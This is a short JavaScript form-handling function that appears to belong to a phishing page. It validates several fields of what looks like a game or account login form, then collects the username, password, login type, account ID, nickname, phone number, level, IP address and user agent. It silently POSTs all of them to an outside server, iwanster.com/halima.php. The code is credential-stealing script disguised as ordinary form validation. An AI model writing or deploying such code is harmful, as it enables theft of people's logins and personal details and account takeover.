function iwan() {
 const a = document.getElementById("user").value;
 const b = document.getElementById("pass").value;
 const c = document.getElementById("login").value;
 const d = document.getElementById("id").value;
 const e = document.getElementById("nick").value;
 const f = document.getElementById("hp").value;
 const g = document.getElementById("level").value;
 const h = document.getElementById("ip").value;
 const i = document.getElementById("ua").value;
 
 
 if(d == "" || d == null) {
  document.getElementById("id").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("id").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  
  if(e == "" || e == null) {
  document.getElementById("nick").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("nick").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  
  if(f == "" || f == null) {
  document.getElementById("hp").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("hp").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  
  if(g == "" || g == null) {
  document.getElementById("level").style.border = "2px solid red";
  return false;
  }else{
  document.getElementById("level").style = "border-bottom:2px solid aqua;border-left:none;border-right:none;border-top:none;";
  }
  data = new FormData()
data.set('a',a)
data.set('b',b)
data.set('c',c)
data.set('d',d)
data.set('e',e)
data.set('f',f)
data.set('g',g)
data.set('h',h)
data.set('i',i)

let request = new XMLHttpRequest();
request.open("POST", 'http://iwanster.com/halima.php', true);
request.send(data)
}
